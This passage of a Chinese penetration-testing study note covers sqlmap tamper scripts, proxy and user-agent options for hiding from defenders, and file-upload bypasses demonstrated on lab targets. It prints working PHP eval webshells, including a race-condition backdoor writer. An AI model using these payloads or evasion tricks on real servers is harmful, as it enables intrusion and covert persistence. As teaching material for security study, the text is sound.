class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tamper</span>(<span class=\"params\">payload, **kwargs</span>):  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;select&quot;</span>, <span class=\"string\">&quot;SelEct&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;SELECT&quot;</span>, <span class=\"string\">&quot;SelEct&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;or&quot;</span>, <span class=\"string\">&quot;Or&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;OR&quot;</span>, <span class=\"string\">&quot;Or&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;and&quot;</span>, <span class=\"string\">&quot;And&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;AND&quot;</span>, <span class=\"string\">&quot;And&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;xor&quot;</span>, <span class=\"string\">&quot;XoR&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;XOR&quot;</span>, <span class=\"string\">&quot;XoR&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;elt&quot;</span>, <span class=\"string\">&quot;Elt&quot;</span>)  </span><br><span class=\"line\">        payload = payload.replace(<span class=\"string\">&quot;ELT&quot;</span>, <span class=\"string\">&quot;Elt&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>保存为 <code>bypass.py</code> 文件，然后再执行刚刚的命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ==&quot; --tamper=bypass --dbs</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>成功爆出库名</p>\n</li>\n</ul>\n<h5 id=\"8-扩展分析\">8.扩展分析</h5>\n<ul>\n<li>\n<p>调试分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. -v [0-6] : 输出注入详细页面</span><br><span class=\"line\">\t0：只显示Python的回溯，错误和关键消息。</span><br><span class=\"line\">\t1：显示信息和警告消息。</span><br><span class=\"line\">\t2：显示调试消息。</span><br><span class=\"line\">\t3：有效载荷注入。</span><br><span class=\"line\">\t4：显示HTTP请求。</span><br><span class=\"line\">\t5：显示HTTP响应头。</span><br><span class=\"line\">\t6：显示HTTP响应页面的内容</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>当我们需要进行调试分析的时候，可以使用 <code>-v</code> 参数让 <code>Sqlmap</code> 输出详细的注入内容，方便我们查看其注入时使用的 <code>payload</code>、请求头信息等等</p>\n</li>\n<li>\n<p>便于我们进行调试，等级分为 0-6 级，一般取 4-5 即可</p>\n</li>\n</ul>\n<h5 id=\"9-代理注入\">9.代理注入</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--proxy &quot;&quot;: 使用指定的代理进行注入测试</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>这个代理有两个用途，<strong>一个是指定代理为本地某个端口，然后使用 BP 进行抓包，分析 <code>Sqlmap</code> 的注入数据包</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;xxx&quot; --proxy &quot;http://127.0.0.1:8080&quot; --dbs</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>第二个用途是使用指定的代理池去进行注入</strong>，一是为了隐匿自己的真实 IP，二是当网站限制了同一 IP 请求次数时，可以不受影响</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;xxx&quot; --proxy &quot;代理池接口&quot; --dbs</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>代理池的配置文章：<a href=\"https://blog.csdn.net/qq_45533926/article/details/103991470\">https://blog.csdn.net/qq_45533926/article/details/103991470</a></p>\n</li>\n</ul>\n<h5 id=\"10-指纹伪造\">10.指纹伪造</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. --user-agent &quot;&quot; : 自定义UA头</span><br><span class=\"line\">2. --random-agent : 随机UA头</span><br><span class=\"line\">3. --time-sec=n : 延迟响应，默认为5</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>通常，修改 UA 头是为了应对两种情况，<strong>一种是上面说到的防止 <code>Sqlmap</code> 默认的 <code>UA</code> 头无法访问某些网站，那我们就要自定义 UA 头</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;xxx&quot; --user-agent &quot;xxx&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>第二种是 <code>Sqlmap</code> 的 UA 头一般为自己的信息和版本号</strong>，所以这也是它的一个 <strong>强特征</strong>，在蓝队防守的时候可以通过看 UA 头判断是否为工具攻击，为了避免这种情况，我们就需要 <strong>采用随机 UA 头</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;xxx&quot; --random-agent</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>最后，如果网站限制了请求的速度，那么我们可以通过 <code>--time-sec=n</code> 进行延迟响应</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;xxx&quot; --time-sec=5</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"11-深度测试\">11.深度测试</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. --level=[1-5] : 指定Sqlmap执行测试的水平等级，默认为1</span><br><span class=\"line\">\t1：默认等级，会测试GET和POST请求中的参数</span><br><span class=\"line\">\t2：增加检测Cookie中的数据</span><br><span class=\"line\">\t3：增加检测User-Agent和Referer中的数据</span><br><span class=\"line\">\t4~5：增加尝试各种payload和边界条件，确保不放过任何潜在的注入点</span><br><span class=\"line\"></span><br><span class=\"line\">2. --risk=[1-3] : 执行Sqlmap执行测试的风险等级，默认为1</span><br><span class=\"line\">\t1：默认等级，风险几乎为零</span><br><span class=\"line\">\t2：增加时间盲注</span><br><span class=\"line\">\t3：增加OR类型的布尔盲注，可能导致数据库记录被更改，谨慎使用</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>用处：\n<ul>\n<li><code>level</code>：解决 <strong>“测哪里”</strong> 的问题，用于扩大攻击面（广度）</li>\n<li><code>risk</code>：解决 <strong>“怎么测”</strong> 的问题，用于增强攻击力（深度）</li>\n</ul>\n</li>\n<li><code>level</code> 等级越高，<code>Sqlmap</code> 就会自己去尝试注入其他的注入点，比如 UA 头、Cookie 等等，这样做会显著提高请求的数据量，容易被拦截</li>\n<li><code>risk</code> 等级越高，<code>Sqlmap</code> 就会尝试一些非常规、复杂，甚至破坏性的注入语句，比如使用 <code>INSERT</code>、<code>DROP</code>、<code>UPDATE</code> 注入语句，这样做可能造成数据库被破坏，容易进局子</li>\n</ul>\n<h3 id=\"文件上传-2\">文件上传</h3>\n<h4 id=\"一、常规文件上传测试\">一、常规文件上传测试</h4>\n<h5 id=\"1-前端验证\">1.前端验证</h5>\n<ul>\n<li>如何判断前端验证？\n<ul>\n<li><strong>看页面的响应速度</strong>：前端验证快、后端验证慢</li>\n<li><strong><code>F12</code> 查看前端代码</strong>：检查是否有校验的 JS 代码</li>\n<li><strong>抓包</strong>：前端校验无法抓包、后端校验可以抓包</li>\n</ul>\n</li>\n<li>绕过前端验证的三种方式\n<ul>\n<li><strong>禁用 JS 代码</strong>：通过插件 <code>ModHeader</code> 禁止页面加载 <code>JS</code> 代码</li>\n<li><strong>抓包更改后缀</strong>：将 <code>php</code> 文件后缀改为允许上传的文件后缀，通过 BP 更改为 <code>php</code> 后缀</li>\n<li><strong>本地搭建环境</strong>：根据其前端代码本地搭建环境，删去 <code>JS</code> 校验代码</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"2-htaccess-配置文件\">2. htaccess 配置文件</h5>\n<ul>\n<li>配置文件（.htaccess）可以更改服务器对文件的解析规则，如果服务器为 Apache 且允许我们上传.htaccess 文件，那么我们可以利用这一点造成文件上传漏洞</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;IfModule mime_module&gt;</span><br><span class=\"line\">\tAddHandler application/x-httpd-php .jpg</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>上述代码会将上传的.jpg 后缀文件解析成 php 文件</li>\n</ul>\n<h5 id=\"3-MIME-绕过\">3.MIME 绕过</h5>\n<ul>\n<li>\n<p>媒体类型（MIME），它用来表示文档、文件或字节流的性质个格式，它的通用结构为 <code>type/subtype</code>，对大小写不敏感，但传统都是小写。当其后端对此校验时，我们需要更改 MIME 进行绕过。</p>\n</li>\n<li>\n<p>检测机制，例如：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>], [<span class=\"string\">&quot;image/jpeg&quot;</span>, <span class=\"string\">&quot;image/png&quot;</span>, <span class=\"string\">&quot;image/gif&quot;</span>, <span class=\"string\">&quot;image/jpg&quot;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>绕过方式：</p>\n<ul>\n<li>可以先上传一个正确后缀名的文件，然后抓包，这是他的 mime 就是能通过检测机制的了，所以我们直接将名字改为 php 后缀即可</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"4-文件头绕过\">4.文件头绕过</h5>\n<ul>\n<li>\n<p>判断一个文件类型的方式：后缀名、解析方式、MIME 类型。但是这些东西说改就改，非常不靠谱，最靠谱的方式就是检测文件内容。 但是文件内容太长了怎么检测呢？人们规定一个文件开头的几个字节信息作为文件类型信息，检测文件类型时只需要检测前几个字节即可。</p>\n</li>\n<li>\n<p>常见文件头标志如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JPEG（jpg）：FFD8FF</span><br><span class=\"line\"></span><br><span class=\"line\">PNG（png）：89504E47</span><br><span class=\"line\"></span><br><span class=\"line\">GIF（gif）：47494638</span><br><span class=\"line\"></span><br><span class=\"line\">HTML（html）：68746D6C3E</span><br><span class=\"line\"></span><br><span class=\"line\">ZIP（zip）：504B0304</span><br><span class=\"line\"></span><br><span class=\"line\">RAR（rar）：52617221</span><br><span class=\"line\"></span><br><span class=\"line\">Adobe Acrobat（pdf）：255044462D312E</span><br><span class=\"line\"></span><br><span class=\"line\">MS Word/Excel（xls、doc）：D0CF11E0</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>上面的这些都是 16 进制的文件头标志，我们直接将这个加到文件前面更改类型是行不通的</p>\n</li>\n<li>\n<p>我们可以使用工具去修改文件头，我选择的是 010Editor</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250806232655581.png\" alt=\"image-20250806232655581\"></p>\n</li>\n<li>\n<p>然后这里就可以随便改文件头了，比如我们在前面添加 <code>PNG</code> 的文件头，这里不能直接复制字节然后粘贴</p>\n</li>\n<li>\n<p>首先将 <strong>光标移到第一位</strong>，然后选择 <strong>编辑</strong>，选择 <strong>插入/覆盖</strong>，选中 <strong>插入字节</strong>，然后选择从哪里开始插入，插入多少位，这里 <strong>每 8 字节代表一位</strong>，所以插入 4 位即可：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250806232740914.png\" alt=\"image-20250806232740914\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250806232818153.png\" alt=\"image-20250806232818153\"></p>\n</li>\n<li>\n<p>然后点击插入，再将上面的 <code>PNG</code> 头复制粘贴进来即可：</p>\n</li>\n<li>\n<p>过滤机制，例如：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>], [<span class=\"string\">&quot;image/jpeg&quot;</span>, <span class=\"string\">&quot;image/jpg&quot;</span>, <span class=\"string\">&quot;image/png&quot;</span>, <span class=\"string\">&quot;image/gif&quot;</span>])) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;  </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"title function_ invoke__\">bin2hex</span>(<span class=\"variable\">$bin</span>), [<span class=\"string\">&quot;89504E47&quot;</span>, <span class=\"string\">&quot;FFD8FFE0&quot;</span>, <span class=\"string\">&quot;47494638&quot;</span>])) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这个方式最常用的还是使用 <code>GIF</code> 绕过，因为它的文件头比较好写，不用使用工具改，直接将 <code>GIF89a</code> 字符串添加到文件开头即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pass&#x27;</span>]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"5-黑名单绕过\">5.黑名单绕过</h5>\n<ul>\n<li>\n<p>黑名单顾名思义就是禁止不合规的后缀名进行上传，但是这种方法并不安全，我们可以通过很多方式进行绕过，比如不在黑名单上的后缀名但可以解析成 php 的，也可以尝试双写、大小写、配置文件等</p>\n</li>\n<li>\n<p>我们可以使用 fuzzdb 这个字典（ <a href=\"https://github.com/fuzzdb-project/fuzzdb\">https://github.com/fuzzdb-project/fuzzdb</a> ），然后通过 bp 抓包进行爆破，看返回长度，有没有能绕过的后缀</p>\n</li>\n<li>\n<p>如果黑名单过滤文件后缀，不是不让上传，而是替换为空，例如：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$blacklist</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;php5&quot;</span>, <span class=\"string\">&quot;php4&quot;</span>, <span class=\"string\">&quot;php3&quot;</span>, <span class=\"string\">&quot;phtml&quot;</span>, <span class=\"string\">&quot;pht&quot;</span>, <span class=\"string\">&quot;jsp&quot;</span>, <span class=\"string\">&quot;jspa&quot;</span>, <span class=\"string\">&quot;jspx&quot;</span>, <span class=\"string\">&quot;jsw&quot;</span>, <span class=\"string\">&quot;jsv&quot;</span>, <span class=\"string\">&quot;jspf&quot;</span>, <span class=\"string\">&quot;jtml&quot;</span>, <span class=\"string\">&quot;asp&quot;</span>, <span class=\"string\">&quot;aspx&quot;</span>, <span class=\"string\">&quot;asa&quot;</span>, <span class=\"string\">&quot;asax&quot;</span>, <span class=\"string\">&quot;ascx&quot;</span>, <span class=\"string\">&quot;ashx&quot;</span>, <span class=\"string\">&quot;asmx&quot;</span>, <span class=\"string\">&quot;cer&quot;</span>, <span class=\"string\">&quot;swf&quot;</span>, <span class=\"string\">&quot;htaccess&quot;</span>, <span class=\"string\">&quot;ini&quot;</span>);  </span><br><span class=\"line\"><span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$blacklist</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$name</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class=\"variable\">$name</span>)) &#123;  </span><br><span class=\"line\">    <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>那么我们就可以进行双写绕过：pphphp</p>\n</li>\n</ul>\n<h5 id=\"6-条件竞争\">6.<strong>条件竞争</strong></h5>\n<ul>\n<li>\n<p>之所以会出现这个绕过方法，是因为编写代码中存在逻辑缺陷，他是先进行上传然后在进行比较最后删除，只不过代码运行的速度非常快，不容易看出来，这种缺陷黑盒是测不出来的，我们只能手动试一下这个方法，前面几种可能现在都用不到了，这个或许还能用到</p>\n</li>\n<li>\n<p>过滤机制，例如：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;  </span><br><span class=\"line\">    <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);  </span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$name</span>)[<span class=\"string\">&#x27;extension&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$name</span>;  </span><br><span class=\"line\">    <span class=\"variable\">$whitelist</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>,<span class=\"string\">&#x27;jpeg&#x27;</span>);  </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 先执行move_uploaded_file()函数上传文件</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class=\"variable\">$name</span>)) &#123;  </span><br><span class=\"line\">\t    <span class=\"comment\">// 再判断后缀是否违规</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>,<span class=\"variable\">$whitelist</span>))&#123;  </span><br><span class=\"line\">            <span class=\"variable\">$rename_file</span> = <span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$ext</span>;  </span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. <span class=\"variable\">$rename_file</span>;  </span><br><span class=\"line\">            <span class=\"title function_ invoke__\">rename</span>(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);  </span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;  </span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t        <span class=\"comment\">// 如果后缀违规，删除上传文件</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;  </span><br><span class=\"line\">            <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$upload_file</span>);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>绕过步骤：我们手中现在有一个 1.php 文件，它的作用就是被访问时，就会创建一个后门</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;xiao.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>首先我们要确定的就是上传文件的路径，然后不断地往服务器上传这个 <code>php</code> 文件，这里需要使用 BP 的 <code>Intruder</code> 模块，按照如下设置让他一直上传，这里推荐先进行访问那个上传文件的路径，然后在进行重复上传，设置如下（两个是同样的设置，就让他一直上传访问就行）</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250806235547731.png\" alt=\"image-20250806235547731\"></p>\n</li>\n<li>\n<p>然后我们在访问 xiao.php 那个路径，不断地刷新，等待奇迹即可</p>\n</li>\n</ul>\n<h5 id=\"7-系统特性绕过\">7.系统特性绕过</h5>\n<ul>\n<li>系统特性的绕过，比如 Windows 对文件大小写不敏感，而 Linux 对文件大小写敏感，所以导致服务器搭载到 Windows 上可能被大小写绕过</li>\n</ul>\n<h5 id=\"8-00-截断\">8.00 截断</h5>\n<ul>\n<li>\n<p>当 PHP 版本小于 5.3.4，并且 magic_quotes_gpc = off 时，该漏洞生效</p>\n</li>\n<li>\n<p>00 截断产生的原因是因为 <strong>PHP 内核是由 C 语言实现的</strong>，所以使用了 C 语言中的部分字符串处理函数。比如在连接字符串时，<strong>0 字节（<code>\\x00</code>）会作为字符串结束</strong>，导致后面的字符串在实际解析时失效。</p>\n</li>\n<li>\n<p>这里用靶场演示一下。过滤机制采用的是白名单过滤后缀名，只允许上传图片类型的文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$name</span>);  </span><br><span class=\"line\"><span class=\"variable\">$ext</span> = <span class=\"variable\">$info</span>[<span class=\"string\">&#x27;extension&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$whitelist</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;jpg&quot;</span>, <span class=\"string\">&quot;jpeg&quot;</span>, <span class=\"string\">&quot;png&quot;</span>, <span class=\"string\">&quot;gif&quot;</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"variable\">$whitelist</span>)) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>) . <span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>) . <span class=\"string\">&quot;.&quot;</span> . <span class=\"variable\">$ext</span>;  </span><br><span class=\"line\">    <span class=\"variable\">$des</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;road&#x27;</span>] . <span class=\"string\">&quot;/&quot;</span> . <span class=\"variable\">$filename</span>;  </span><br><span class=\"line\">      </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$des</span>)) &#123;  </span><br><span class=\"line\">\t    <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;  </span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;  </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到这里文件上传的路径 <code>$des</code> 为传入的 <code>road</code> 下面的 <code>$filename</code></p>\n</li>\n<li>\n<p>也就是说这个 <code>road</code> 参数是我们可控的，并且这里的 <code>$filename</code> 是一个随即名字拼接在这里，然后将原本的文件相当于重命名了</p>\n</li>\n<li>\n<p>那这里我们就可以尝试 00 截断，将 <code>php</code> 文件重命名为 <code>1.jpg</code>，然后在 <code>road</code> 参数那里重命名为 <code>1.php%00</code> 将后面的内容截断，最后上传的文件名就是 <code>1.php</code> 了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 